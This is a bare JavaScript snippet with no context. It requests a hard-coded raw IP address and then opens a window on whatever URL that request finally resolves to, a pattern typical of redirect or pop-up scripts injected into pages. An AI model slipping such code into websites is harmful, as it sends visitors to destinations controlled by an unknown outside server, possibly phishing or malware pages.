var x=new XMLHttpRequest();x.open('GET','https://188.4.181.71');x.send();
x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
